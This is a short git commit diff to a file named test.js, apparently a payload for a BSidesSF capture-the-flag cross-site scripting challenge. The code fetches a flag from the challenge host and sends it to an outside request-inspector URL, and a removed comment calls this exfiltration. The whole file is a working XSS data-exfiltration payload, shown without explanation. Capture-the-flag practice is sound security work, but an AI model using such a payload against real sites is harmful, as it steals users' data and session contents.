3cb2a33613e5c8621b30d2c592a4b9c094b3d09f
s1gk1ll-7 <sgkllsgkll@gmail.com>
2026-03-21 02:01:22 +0000

    Update test.js

--- test.js
+++ test.js
@@ -1,6 +1,5 @@
-fetch('/xss-two-flag')
+fetch('https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag')
   .then(r => r.text())
   .then(flag => {
-      // Exfiltrate to HTTP Request Inspector
       fetch('https://01km6z71vd9qasxg8qxnyp9fqk00-55d2282f5d0bffdeadb8.requestinspector.com?flag=' + encodeURIComponent(flag));
   });
